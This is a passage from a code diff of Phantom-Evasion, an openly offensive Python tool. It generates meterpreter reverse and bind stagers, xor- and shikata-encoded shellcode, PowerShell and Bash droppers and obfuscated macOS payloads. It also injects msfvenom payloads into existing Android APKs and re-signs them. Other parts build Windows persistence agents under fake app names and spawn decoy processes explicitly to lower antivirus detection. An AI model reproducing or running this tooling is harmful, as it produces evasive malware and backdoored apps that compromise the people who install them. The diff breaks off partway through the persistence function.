             subprocess.call(['gcc','Source.c','-o',filename,'-mwindows','-no-pie'],shell=True)
@@ -866,44 +1097,37 @@ def auto_compiler(module_type,arch,filename,ws2 = False):
 
 def shellcode_options():
     clear()
-    py_version=platform.python_version()
+
     print(bcolors.OCRA + "[<Payload>] choose how to supply shellcode:\n\n" + bcolors.ENDC)
     print("[1] Msfvenom\n")
     print("[2] Custom shellcode\n")
     print("[0] Back\n")
-    if py_version[0] == "3":
-        ans=input("\n[>] Please insert choice\'s number: ")
-    else:
-        ans=raw_input("\n[>] Please insert choice\'s number: ")        
+
+    ans=InputFunc("\n[>] Please insert choice\'s number: ")        
     return ans  
 
 def module_launcher1(module_choice):
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
-    else:
-        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
+
+    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom payload (example: windows/meterpreter/reverse_tcp):" + bcolors.ENDC)
         
     if "reverse" in payload_choice:
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert LHOST: ")
-            port=input("\n[>] Please insert LPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert LHOST: ")
-            port=raw_input("\n[>] Please insert LPORT: ")
+
+        commtype=InputFunc("\n[>] Please insert LHOST: ")
+        port=InputFunc("\n[>] Please insert LPORT: ")
 
     elif "bind" in payload_choice:
 
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert RHOST: ")
-            port=input("\n[>] Please insert RPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert RHOST: ")
-            port=raw_input("\n[>] Please insert RPORT: ")
+        commtype=InputFunc("\n[>] Please insert RHOST: ")
+        port=InputFunc("\n[>] Please insert RPORT: ")
 
     else:
+
         payload_advisor(payload_choice,module_choice)
+
         return None
+
+    CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: blank): ")
+
     if "x64" in payload_choice:
 
         Arc = "x64"
@@ -914,11 +1138,7 @@ def module_launcher1(module_choice):
         Arc = "x86"
         enc_type = encoding_selection32()
 
-    if py_version[0] == "3":
-
-        output_filename = input("\n[>] Enter output filename: ")
-    else:
-        output_filename = raw_input("\n[>] Enter output filename: ")     
+    output_filename = InputFunc("\n[>] Enter output filename: ")     
 
     Procnumb=require_multiproc()
         
@@ -927,7 +1147,7 @@ def module_launcher1(module_choice):
 
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
 
-    Payload = payload_generator(payload_choice,Arc,commtype,port,"c")
+    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"c")
 
     if enc_type == "2":
         print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
@@ -958,15 +1178,10 @@ def module_launcher1(module_choice):
     Enter2Continue()
 
 def module_launcher2(module_choice):
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        custom_shellcode = input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
-        output_filename = input("\n[>] Enter output filename: ")
-        arch = input("\n>] Please insert compiler option (x86 or x64): ")
-    else:
-        custom_shellcode = raw_input("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
-        output_filename = raw_input("\n[>] Enter output filename: ")
-        arch = raw_input("\n[>] Please insert compiler option (x86 or x64): ")
+
+    custom_shellcode = InputFunc("\n[>] Please enter custom shellcode (example: \\xff\\xbc\\xb9\\a6 ): ")
+    output_filename = InputFunc("\n[>] Enter output filename: ")
+    arch = InputFunc("\n[>] Please insert compiler option (x86 or x64): ")
 
     module_choice = "Modules/payloads/" + module_choice
 
@@ -1017,11 +1232,7 @@ def encoding_selection32():
     print("[3] x86/shikata_ga_nai + Double Multibyte-key xor      (excellent)\n")
     print("[4] x86/shikata_ga_nai + Triple Multibyte-key xor      (excellent)\n")
 
-    if py_version[0] == "3":
-
-        enc_type = input("\n[>] Please enter options number: ")
-    else:
-        enc_type = raw_input("\n[>] Please enter options number: ")
+    enc_type = InputFunc("\n[>] Please enter options number: ")
 
     return enc_type
 
@@ -1033,11 +1244,8 @@ def encoding_selection64():
     print("[2] x64/xor + Multibyte-key xor                            (good)\n")
     print("[3] x64/xor + Double Multibyte-key xor                (excellent)\n")
     print("[4] x64/xor + Triple Multibyte-key xor                (excellent)\n")
-    if py_version[0] == "3":
 
-        enc_type = input("\n[>] Please enter options number: ")
-    else:
-        enc_type = raw_input("\n[>] Please enter options number: ")
+    enc_type = InputFunc("\n[>] Please enter options number: ")
 
     return enc_type
 
@@ -1051,36 +1259,25 @@ def encoding_selection_custom():
     print("[3] Double Multibyte-key xor                        (excellent)\n")
     print("[4] Triple Multibyte-key xor                        (excellent)\n")
 
-    if py_version[0] == "3":
-
-        enc_type = input("\n[>] Please enter options number: ")
-    else:
-        enc_type = raw_input("\n[>] Please enter options number: ")
+    enc_type = InputFunc("\n[>] Please enter options number: ")
 
     return enc_type
 
 
 def require_multiproc():
-    py_version=platform.python_version()
     print(bcolors.OCRA + "\n[>] Spawn Multiple Processes:\n" + bcolors.ENDC)
     print("During target-side execution this will cause to spawn a maximum of 4 processes") 
     print("consequentialy.\n")
     print("Only the last spawned process will reach the malicious section of code")
     print("while the other decoy processes spawned before will executes only random junk code")
     print("PRO: Longer execution time,Lower rate of detection.")
-    print("CONS: Higher resource consumption.")
- 
-    if py_version[0] == "3":
-        ans=YesOrNo(input("\n[>] Add multiple processes behaviour?(y/n): "))
-    else:
-        ans=YesOrNo(raw_input("\n[>] Add multiple processes behaviour?(y/n): "))
+
+    ans=YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))
 
     if ans == "True":
 
-        if py_version[0] == "3":
-            Procnumb=input("\n[>] Insert number of decoy processes (integer between 1-3): ")
-        else:
-            Procnumb=raw_input("\n[>] Insert number of decoy processes (integer between 1-3): ")
+        Procnumb=InputFunc("\n[>] Insert number of decoy processes (integer between 1-3): ")
+
         if (Procnumb == "1") or (Procnumb == "2") or (Procnumb == "3"):
             
             return Procnumb
@@ -1091,20 +1288,21 @@ def require_multiproc():
 
 def powershell_options(module_type):
     clear()
-    py_version=platform.python_version()
+
     if module_type == "1":
+
         print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
         print("[1] Msfvenom powershell payload\n")
         print("[2] Custom powershell file\n")
         print("[0] Back\n")
 
     if module_type == "2":
+
         print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
         print("[1] Custom powershell Oneline  (Empire-like) \n")
-    if py_version[0] == "3":
-        ans=input("\n[>] Please insert choice\'s number: ")
-    else:
-        ans=raw_input("\n[>] Please insert choice\'s number: ")        
+
+    ans=InputFunc("\n[>] Please insert choice\'s number: ")
+        
     return ans
 
 def powershell_completer(module_type):
@@ -1127,38 +1325,31 @@ def powershell_completer(module_type):
         powershell_type = powershell_options("2")
 
         if powershell_type == "1":
+
             powershell_launcher2(module_type)    
 
     
             
 def powershell_launcher1(module_choice):
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
-    else:
-        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
+
+    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
         
     if "reverse" in payload_choice:
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert LHOST: ")
-            port=input("\n[>] Please insert LPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert LHOST: ")
-            port=raw_input("\n[>] Please insert LPORT: ")
+
+        commtype=InputFunc("\n[>] Please insert LHOST: ")
+        port=InputFunc("\n[>] Please insert LPORT: ")
 
     elif "bind" in payload_choice:
 
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert RHOST: ")
-            port=input("\n[>] Please insert RPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert RHOST: ")
-            port=raw_input("\n[>] Please insert RPORT: ")
+        commtype=InputFunc("\n[>] Please insert RHOST: ")
+        port=InputFunc("\n[>] Please insert RPORT: ")
 
 
     else:
         payload_advisor(payload_choice,module_choice)
         return None
+
+    CustomOpt=InputFunc("\n[>] Custom msfvenom options(default: blank): ")
 
     if "x64" in payload_choice:
 
@@ -1169,11 +1360,7 @@ def powershell_launcher1(module_choice):
         Arc = "x86"
 
 
-    if py_version[0] == "3":
-
-        output_filename = input("\n[>] Enter output filename: ")
-    else:
-        output_filename = raw_input("\n[>] Enter output filename: ")   
+    output_filename = InputFunc("\n[>] Enter output filename: ")   
 
     Procnumb=require_multiproc()     
 
@@ -1181,7 +1368,7 @@ def powershell_launcher1(module_choice):
 
     print(bcolors.GREEN + "\n[>] Generating powershell payload...\n" + bcolors.ENDC) 
 
-    Payload = payload_generator(payload_choice,Arc,commtype,port,"psh")
+    Payload = payload_generator(payload_choice,Arc,commtype,port,CustomOpt,"psh")
 
     print(bcolors.GREEN + "\n[>] Generating C powershell dropper...\n" + bcolors.ENDC) 
 
@@ -1202,36 +1389,22 @@ def powershell_launcher1(module_choice):
     sleep(3)
 
 def powershell_launcher2(module_choice):
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):
-            powershell_payload = ""
-            path2psfile = input("\n[>] Please enter the path of the powershell script: ")
-            powershellfile = open(path2psfile, "r")
-            for line in powershellfile:
-                powershell_payload += line
-    
-        if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):
 
-            powershell_payload = input("\n[>] Please enter powershell oneline payload: ")
+    if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):
 
-        output_filename = input("\n[>] Enter output filename: ")
-        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
-    else:
-        if (module_choice == "Polymorphic_PowershellScriptDropper_windows.py") or (module_choice == "Polymorphic_PowershellScriptDropper_NDC_LLGPA_windows.py"):
-            powershell_payload = ""
-            path2psfile = raw_input("\n[>] Please enter the path of the powershell script: ")
-            powershellfile = open(path2psfile, "r")
-            for line in powershellfile:
-                powershell_payload += line
+        powershell_payload = ""
+        path2psfile = InputFunc("\n[>] Please enter the path of the powershell script: ")
+        powershellfile = open(path2psfile, "r")
+        for line in powershellfile:
+            powershell_payload += line
     
 
-        if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):
+    if (module_choice == "Polymorphic_PowershellOnelineDropper_windows.py") or (module_choice == "Polymorphic_PowershellOnelineDropper_NDC_LLGPA_windows.py"):
 
-            powershell_payload = raw_input("\n[>] Please enter powershell oneline payload: ")
+        powershell_payload = InputFunc("\n[>] Please enter powershell oneline payload: ")
 
-        output_filename = raw_input("\n[>] Enter output filename: ")
-        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+    output_filename = InputFunc("\n[>] Enter output filename: ")
+    arch = InputFunc("\n[>] Enter resulting arch format  (x86 or x64)  : ")
 
     Procnumb=require_multiproc()
 
@@ -1249,19 +1422,18 @@ def powershell_launcher2(module_choice):
     print("\n[<>] File saved in Phantom-Evasion folder!\n")
     sleep(3)
 
-def Polymorphic_C_x86Meterpreter_launcher(module_type):
+def Polymorphic_C_Meterpreter_launcher(module_type):
+
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        LHOST=input("\n[>] Please insert LHOST: ")
-        LPORT=input("\n[>] Please insert LPORT: ")
-        OUTFILE=input("\n[>] Please insert output filename: ")
-    else:
-        LHOST=raw_input("\n[>] Please insert LHOST: ")
-        LPORT=raw_input("\n[>] Please insert LPORT: ")
-        OUTFILE=raw_input("\n[>] Please insert output filename: ")
+
+    LHOST=InputFunc("\n[>] Please insert LHOST: ")
+    LPORT=InputFunc("\n[>] Please insert LPORT: ")
+    OUTFILE=InputFunc("\n[>] Please insert output filename: ")
+
     sleep(0.5)
+
     Procnumb=require_multiproc()
+
     print(bcolors.GREEN + "\n[>] Generating C meterpreter stager\n" + bcolors.ENDC)
     
     if platform.system() == "Linux":
@@ -1276,7 +1448,15 @@ def Polymorphic_C_x86Meterpreter_launcher(module_type):
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
-    auto_compiler("windows","x86",OUTFILE,True)
+    if "x64" in module_type:
+
+        Arch="x64"
+
+    else:
+
+        Arch="x86"
+
+    auto_compiler("windows",Arch,OUTFILE,True)
 
     print("\n[<>] File saved in Phantom-Evasion folder\n")
     Enter2Continue()
@@ -1284,15 +1464,11 @@ def Polymorphic_C_x86Meterpreter_launcher(module_type):
 
 def BashOnelinerDropper():
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        Bash_payload=input("\n[>] Insert Bash online payload: ")
-        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
-        output_filename = input("\n[>] Enter output filename: ")
-    else:
-        Bash_payload=raw_input("\n[>] Insert Bash online payload: ")
-        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
-        output_filename = raw_input("\n[>] Enter output filename: ")  
+
+    Bash_payload=InputFunc("\n[>] Insert Bash online payload: ")
+    arch = InputFunc("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+    output_filename = InputFunc("\n[>] Enter output filename: ")
+  
 
     sleep(0.2)
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
@@ -1315,13 +1491,11 @@ def BashOnelinerDropper():
 
     
 def osx_cascade_encoding():
-    py_version=platform.python_version()
-    if py_version[0] == "3":     
-        osx_payload = input("\n[>] Enter msfvenom osx 32 bit payload : ")
-    else:
-        osx_payload = raw_input("\n[>] Enter msfvenom osx 32 bit payload : ")
+
+    osx_payload = InputFunc("\n[>] Enter msfvenom osx 32 bit payload : ")
 
     encoder_list = ["x86/countdown","x86/shikata_ga_nai","x86/fnstenv_mov","x86/jmp_call_additive","x86/call4_dword_xor"]
+
     shuffle(encoder_list)
     numb_iter1=str(random.randint(2,4))
     numb_iter2=str(random.randint(2,4))
@@ -1347,30 +1521,21 @@ def osx_cascade_encoding():
     numb_iter6="5"
 
     if "reverse" in osx_payload:
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert LHOST: ")
-            port=input("\n[>] Please insert LPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert LHOST: ")
-            port=raw_input("\n[>] Please insert LPORT: ")
+
+        commtype=InputFunc("\n[>] Please insert LHOST: ")
+        port=InputFunc("\n[>] Please insert LPORT: ")
         commtype="LHOST=" + commtype
         port="LPORT=" + port
 
     elif "bind" in osx_payload:
 
-        if py_version[0] == "3":
-            commtype=input("\n[>] Please insert RHOST: ")
-            port=input("\n[>] Please insert RPORT: ")
-        else:
-            commtype=raw_input("\n[>] Please insert RHOST: ")
-            port=raw_input("\n[>] Please insert RPORT: ")
+        commtype=InputFunc("\n[>] Please insert RHOST: ")
+        port=InputFunc("\n[>] Please insert RPORT: ")
 
         commtype="RHOST=" + commtype
         port="RPORT=" + port
-    if py_version[0] == "3":
-        macho_filename = input("\n[>] Enter output filename: ")
-    else:
-        macho_filename = raw_input("\n[>] Enter output filename: ")
+
+    macho_filename = raw_input("\n[>] Enter output filename: ")
     macho_filename = macho_filename + ".macho"
     print (bcolors.GREEN + "\n[>] Generating multi-encoded Mach-o ...\n" + bcolors.ENDC)
 
@@ -1403,154 +1568,242 @@ def osx_cascade_encoding():
     print("\n[<>] File saved in Phantom-Evasion folder!\n")
 
 def apk_msfvenom():
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)
-        Lhost=input("\n[>] Please insert LHOST: ")
-        Lport=input("\n[>] Please insert LPORT: ")
 
-    else:
-        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)
-        Lhost=raw_input("\n[>] Please insert LHOST: ")
-        Lport=raw_input("\n[>] Please insert LPORT: ") 
+    payload_choice=InputFunc(bcolors.OCRA + "\n[>] Please enter msfvenom android payload:" + bcolors.ENDC)
+
+    Lhost=InputFunc("\n[>] Please insert LHOST: ")
+    Lport=InputFunc("\n[>] Please insert LPORT: ")
+    CustomOpt=InputFunc("\n[>] Custom msfvenom options (default:blank): ")
 
     Lhost= "LHOST=" + str(Lhost)
     Lport= "LPORT=" + str(Lport)
+
     print(bcolors.GREEN + "\n[>] Generating Apk Payload...\n" + bcolors.ENDC)
-    if platform.system() == "Windows":
-        
-        subprocess.call(['msfvenom','-p',payload_choice,'--platform','Android','-a','dalvik',Lhost,Lport,'-o','msf_gen.apk'],shell=True)
-    else:
-        subprocess.call(['msfvenom','-p',payload_choice,'--platform','Android','-a','dalvik',Lhost,Lport,'-o','msf_gen.apk'])
+
+    os.system("msfvenom -p " + payload_choice + " --platform Android -a dalvik " + Lhost +  " " + Lport + " " + CustomOpt + " -o msf_gen.apk")
+
 
 def apktool_d(baksmali,name):
+
     print(bcolors.GREEN + "\n[>] Baksmaling...\n" + bcolors.ENDC)
+
     if platform.system() == "Windows":
         
-        subprocess.call(['apktool.jar','d','-f',baksmali,'-o',name],shell=True)    
+        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','d',baksmali,'-o',name],shell=True)
+    
     else:
-        subprocess.call(['apktool','d','-f',baksmali,'-o',name])
+
+        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','d',baksmali,'-o',name])
         
 def apktool_b(smali):
+
     print(bcolors.GREEN + "\n[>] Smaling...\n" + bcolors.ENDC)
+
     if platform.system() == "Windows":
         
-        subprocess.call(['apktool.jar','b','-f',smali,'-o','msf_rebuild.apk'],shell=True)
+        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','b',smali,'-o','msf_rebuild.apk'],shell=True)
     else:
-        subprocess.call(['apktool','b','-f',smali,'-o','msf_rebuild.apk'])
+        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.3.3.jar','b',smali,'-o','msf_rebuild.apk'])
+
+
+
+def apktool_remove1apkfram():
+
+    print(bcolors.GREEN + "\n[>] Removing 1.apk framework...\n" + bcolors.ENDC)
+
+    if platform.system() == "Windows":
+        
+        subprocess.call(['apktool','empty-framework-dir','--force'],shell=True)
+    else:
+        subprocess.call(['apktool','empty-framework-dir','--force'])
+
+    sleep(0.2)
 
         
-def sign_apk():
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        Apk_out=input("\n[>] Please insert output filename: ") 
-    else:
-        Apk_out=raw_input("\n[>] Please insert output filename: ")
-    Apk_out+= ".apk"
+def apksigner():
+
+    Apk_out=InputFunc("\n[>] Please insert output filename: ")
+
+    if ".apk" not in Apk_out:
+
+        Apk_out+= ".apk"
+
+
+    #print(bcolors.GREEN + "\n[>] Aligning with Zipalign..." + bcolors.ENDC)
+
+    #subprocess.call(['zipalign','-p','4','msf_rebuild.apk',Apk_out])
+    os.rename('msf_rebuild.apk',Apk_out)
+    #sleep(2)
+
   
     print(bcolors.GREEN + "\n[>] Resigning apk...\n" + bcolors.ENDC)
-    pem_pk8()
+    keytool_keystore()
     sleep(0.5)
-    if platform.system() == "Windows":
-        
-        subprocess.call(['java','-jar','Setup/apk_sign/signapk.jar','Setup/apk_sign/certificate.pem','Setup/apk_sign/key.pk8','msf_rebuild.apk',Apk_out],shell=True)
-    else:
-        subprocess.call(['java','-jar','Setup/apk_sign/signapk.jar','Setup/apk_sign/certificate.pem','Setup/apk_sign/key.pk8','msf_rebuild.apk','resigned.apk'])
-        print(bcolors.GREEN + "[>]Aligning with Zipalign...\n" + bcolors.ENDC)
-        subprocess.call(['zipalign','-p','4','resigned.apk',Apk_out])
-    sleep(2)
+    Info=open("Setup/apk_sign/keystore_info.txt","r")
+
+    for line in Info:
+
+        if "Alias:" in line:
+
+            Alias=line.split()[1]
+
+        elif "KeystorePassword:" in line:
+
+            KeystorePassword=line.split()[1]
+
+    os.system("apksigner sign --ks Setup/apk_sign/keystore.keystore --ks-key-alias " + Alias + " --ks-pass pass:" + KeystorePassword + " --key-pass pass:" + KeystorePassword + " " + Apk_out)
 
     
 
-def pem_pk8():
-    Cert=os.path.isfile("Setup/apk_sign/certificate.pem")
-    Pk8=os.path.isfile("Setup/apk_sign/key.pk8")
-    if Cert and Pk8:
-       print("X509 Certificate and key pk8\n")
+def keytool_keystore():
+
+    Cert=os.path.isfile("Setup/apk_sign/keystore.keystore")
+    Info=os.path.isfile("Setup/apk_sign/keystore_info.txt")
+
+    if Cert and Info:
+
+       print(bcolors.GREEN + "[+] Keystore found\n" + bcolors.ENDC)
+       sleep(0.2)       
+
     else:
-       print("[+] First run of Apk signer!! you need to create a certificate to sign apk\n")
-       sleep(1)
-       print("[+] Fill (or leave it blank) options required\n")
-       sleep(4)
-       if platform.system() == "Windows":
 
-           subprocess.call(['openssl','genrsa','-out','Setup/apk_sign/key.pem','1024'],shell=True)
-           subprocess.call(['openssl','req','-new','-key','Setup/apk_sign/key.pem','-out','Setup/apk_sign/request.pem'],shell=True)
-           subprocess.call(['openssl','x509','-req','-days','9999','-in','Setup/apk_sign/request.pem','-signkey','Setup/apk_sign/key.pem','-out','Setup/apk_sign/certificate.pem'],shell=True)
-           subprocess.call(['openssl','pkcs8','-topk8','-outform','DER','-in','Setup/apk_sign/key.pem','-inform','PEM','-out','Setup/apk_sign/key.pk8','-nocrypt'],shell=True)
-           
-       else:    
-           subprocess.call(['openssl','genrsa','-out','Setup/apk_sign/key.pem','1024'])
-           subprocess.call(['openssl','req','-new','-key','Setup/apk_sign/key.pem','-out','Setup/apk_sign/request.pem'])
-           subprocess.call(['openssl','x509','-req','-days','9999','-in','Setup/apk_sign/request.pem','-signkey','Setup/apk_sign/key.pem','-out','Setup/apk_sign/certificate.pem'])
-           subprocess.call(['openssl','pkcs8','-topk8','-outform','DER','-in','Setup/apk_sign/key.pem','-inform','PEM','-out','Setup/apk_sign/key.pk8','-nocrypt'])
+        print(bcolors.RED + "[+] Keystore not found\n" + bcolors.ENDC)
+        sleep(0.2)
+        Keytool=""
 
-       os.remove("Setup/apk_sign/request.pem") 
-       os.remove("Setup/apk_sign/key.pem")
+        while Keytool != "1" and Keytool != "2":
+
+            print(bcolors.OCRA + "[<Keytool>] :\n\n" + bcolors.ENDC)
+            print("[1] Random\n")
+            print("[2] Custom user input\n")
+
+
+
+            Keytool=InputFunc("\n[>] Select keystore generation mode: ")
+
+            if Keytool != "1" and Keytool != "2":
+
+                print("[-] Invalid option\n")  
+
+            elif Keytool == "1":
+        
+                Alias = RandString()
+                Passw = RandString()
+                Link = RandString() + ".com"
+                OU = RandString()
+                O = RandString()
+                Loc = RandString()
+                S = RandString()
+                Country = RandString()        
+
+
+
+            elif Keytool == "2":
+
+                print("[+] Fill requested info or leave it blank:")
+                sleep(0.8)       
+                Alias = InputFunc("\n[>] Insert Keystore Alias: ")
+                Passw = InputFunc("\n[>] Insert Keystore Password: ")
+                Link = InputFunc("\n[>] Organization link: ")
+                OU = InputFunc("\n[>] Organization unit: ")
+                O = InputFunc("\n[>] Organization name: ")
+                Loc = InputFunc("\n[>] Locality: ")
+                S = InputFunc("\n[>] State: ")
+                Country = InputFunc("\n[>] Country: ")
+        
+        sleep(0.2)
+
+        os.system("keytool -genkey -noprompt -alias " + Alias + " -dname \"CN=" + Link + ", OU=" + OU + " , O= " + O + ", L=" + Loc + ", S=" + S + ", C=" + Country + "\" -keystore Setup/apk_sign/keystore.keystore -keyalg RSA -keysize 2048 -validity 10000 -storepass " + Passw + " -keypass "  + Passw)
+
+        Data2Store=""
+        Data2Store+="Alias: " + Alias + "\n"
+        Data2Store+="KeystorePassword: " + Passw + "\n"
+
+        with open("Setup/apk_sign/keystore_info.txt","w") as InfoKeystore:
+
+            InfoKeystore.write(Data2Store)
+            InfoKeystore.close() 
+
+        
+
+        
 
 def droidmare_launcher():
     clear()
     print(bcolors.OCRA + "\n[>] MODE:" + bcolors.ENDC)
+
     print("\n[1] Obfuscate msf payload")
     print("\n[2] Obfuscate msf payload & Backdoor existing Apk \n")
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        decision =input(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
-    else: 
-        decision =raw_input(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
+
+    decision = InputFunc(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
+
     if decision == "1":
         apk_msfvenom()
-        sleep(0.5)
+        sleep(0.2)
+        #apktool_remove1apkfram()
         apktool_d("msf_gen.apk","msf_smali")
-        sleep(0.5)
+        sleep(0.2)
         print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
+
         if platform.system() == "Windows":
-            subprocess.call(['py','Modules/payloads/Smali_Droidmare.py','msf_smali'],shell=True)
+
+            subprocess.call(['py','Modules/payloads/SmaliObfuscator_android.py','msf_smali'],shell=True)
         else:
             
-            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali'])
-        sleep(0.5)
+            subprocess.call(['python','Modules/payloads/SmaliObfuscator_android.py','msf_smali'])
+        sleep(0.1)
         apktool_b("msf_smali")
-        sleep(0.5)
-        sign_apk()
-        sleep(0.5)
+        sleep(0.1)
+        apksigner()
+        sleep(0.1)
         rmtree("msf_smali")
         os.remove("msf_gen.apk")
-        os.remove("msf_rebuild.apk")
-        os.remove("resigned.apk")
-        print("\n[>] New Apk saved in phantom folder")
+        #os.remove("msf_rebuild.apk")
+
+        print("\n[>] New Apk saved in Phantom-Evasion folder")
+
         sleep(2)
 
 
     elif decision == "2":
         apk_msfvenom()
         sleep(0.5)
-        if py_version[0] == "3":
-            apktobackdoor=input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC)
-        else:
-            apktobackdoor=raw_input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC)          
+
+        apktobackdoor=InputFunc(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC) 
+
+         
         if ".apk" not in apktobackdoor:
             apktobackdoor += ".apk"
+
+        #apktool_remove1apkfram()
+        sleep(0.1)
         apktool_d("msf_gen.apk","msf_smali")
         apktool_d(apktobackdoor,"apk_smali")
+        DBG=InputFunc("[Decompiled]")
         sleep(0.5)
+
         print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)
+
         if platform.system() == "Windows":
             
-            subprocess.call(['py','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"],shell=True)
+            subprocess.call(['py','Modules/payloads/SmaliObfuscator_android.py','msf_smali',"apk_smali"],shell=True)
         else:
             
-            subprocess.call(['python','Modules/payloads/Smali_Droidmare.py','msf_smali',"apk_smali"])
+            subprocess.call(['python','Modules/payloads/SmaliObfuscator_android.py','msf_smali',"apk_smali"])
+
+        DBG=InputFunc("[Obfuscated/Backdoored]")
+
         sleep(0.5)
         apktool_b("apk_smali")
         sleep(0.5)
-        sign_apk()
+        apksigner()
         sleep(0.5)
         rmtree("msf_smali")
         rmtree("apk_smali")
+
         os.remove("msf_gen.apk")
-        os.remove("msf_rebuild.apk")
-        os.remove("resigned.apk")
+        #os.remove("msf_rebuild.apk")
+
         print("\n[>] New Apk saved in Phantom-Evasion folder")
         sleep(2)
 
@@ -1561,47 +1814,31 @@ def droidmare_launcher():
 
 def Windows_C_PersistenceAgent(module_type):        #At Startup
     clear()
-    py_version=platform.python_version()
-    if py_version[0] == "3":
-        if "Startup" in module_type:
-            FpathOrFname=input("\n[>] Insert file path to add to startup: ")
-            FakeAppName=input("\n[>] Insert fake app name: ")
-            Elevated = YesOrNo(input("\n[>] Require admin privilege? (y/n):"))
-            EvasionJunkcode = YesOrNo(input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
-            OutputResult = YesOrNo(input("\n[>] Add result output code? (prints completed or failed) (y/n):"))
-            Procnumb=require_multiproc()
-                        
-            
-        elif "TimeBased" in module_type:
-            Procname=input("\n[>] Insert the name of the process to keep-alive: ") 
-            FpathOrFname=input("\n[>] Insert fullpath to the file to execute if process died: ")
-            CheckTime=input("\n[>] Insert time interval to check if process died (in seconds): ")
-            EvasionJunkcode = YesOrNo(input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
-            Procnumb=require_multiproc()
-            CheckTime += "000"
 
-        CompileFor=input("\n[>] Insert compiler option (x86 or x64): ")
-        OutFile=input("\n[>] Insert output filename: ")
-    else:
-        if "Startup" in module_type:
-            FpathOrFname=raw_input("\n[>] Insert file path to add to startup: ")
-            FakeAppName=raw_input("\n[>] Insert fake app name: ")
-            Elevated = YesOrNo(raw_input("\n[>] Require admin privilege? (y/n):"))
-            EvasionJunkcode = YesOrNo(raw_input("\n[>] Add antivirus evasion code and junkcode? (y/n):"))
-            OutputResult = YesOrNo(raw_input("\n[>] Add result output code? (prints completed or failed) (y/n):"))
-            Procnumb=require_multiproc()
-        elif "TimeBased" in module_type:
